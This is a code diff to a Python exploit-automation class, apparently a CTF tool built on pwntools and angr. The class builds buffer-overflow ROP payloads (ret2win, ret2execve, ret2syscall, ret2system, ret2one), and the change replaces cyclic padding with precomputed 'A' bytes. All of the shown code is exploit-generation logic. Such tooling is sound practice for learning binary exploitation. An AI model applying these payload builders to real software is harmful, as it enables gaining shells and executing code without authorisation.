@@ -60,12 +60,12 @@ class ROP:
             core = p.corefile
             p.close()
             os.remove(core.file.name)
-            return cyclic_find(core.read(core.rsp, 8), n=8)
+            return b'A'*cyclic_find(core.read(core.rsp, 8), n=8)
         except PwnlibException as e:
             return Get2overflow(self.filename).buf()
 
     def ret2win(self, failed):
-        payload = cyclic(self.offset)
+        payload = self.offset
         if failed:
             payload += self.realign()
         payload += p64(self.e.sym["win"])
@@ -74,7 +74,7 @@ class ROP:
     
     def ret2win_with_args(self, failed):
         #TODO: Instead of passing address to win, return address to system or execve inside of win to avoid argument
-        payload = cyclic(self.offset)
+        payload = self.offset
         payload += self.satisfy_win()
         if failed:
             payload += self.realign()
@@ -83,7 +83,7 @@ class ROP:
         return payload
 
     def ret2execve(self, failed):
-        payload = cyclic(self.offset)
+        payload = self.offset
         payload += self.generic_first_arg()
         payload += self.fill_reg("rsi", 0)
         payload += self.fill_reg("rdx", 0)
@@ -94,7 +94,7 @@ class ROP:
         return payload
 
     def ret2syscall(self, failed):
-        payload = cyclic(self.offset)
+        payload = self.offset
         payload += self.fill_reg("rax", 59)
         payload += self.generic_first_arg()
         payload += self.fill_reg("rsi", 0)
@@ -106,7 +106,7 @@ class ROP:
         return payload
     
     def ret2system(self, failed):
-        payload = cyclic(self.offset)
+        payload = self.offset
         payload += self.generic_first_arg() 
         payload += self.fill_reg("rsi", 0)
         if failed:
@@ -116,7 +116,7 @@ class ROP:
         return payload
 
     def ret2one(self, failed):
-        payload = cyclic(self.offset)
+        payload = self.offset
         p = process(self.filename)
         p.recvuntil(b": ")
         leak = p.recvline().decode('utf-8').strip()
@@ -280,5 +280,5 @@ class Get2overflow:
         return simgr
 
     def buf(self):
-        return len(self.symbolic_padding)
+        return self.symbolic_padding
 
